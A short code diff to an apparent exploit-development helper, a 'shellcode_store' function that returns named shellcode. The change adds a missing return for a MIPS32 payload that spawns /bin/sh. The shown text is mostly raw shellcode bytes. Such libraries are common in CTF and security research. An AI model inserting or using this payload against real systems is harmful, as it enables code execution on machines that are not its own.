@@ -195,6 +195,7 @@ def shellcode_store(demand):
         return shellcode
     elif demand=='mips32_shell':
         shellcode=b"\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh"
+        return shellcode
     else:
         assert False,"Pass in unrecognized parameter"
 
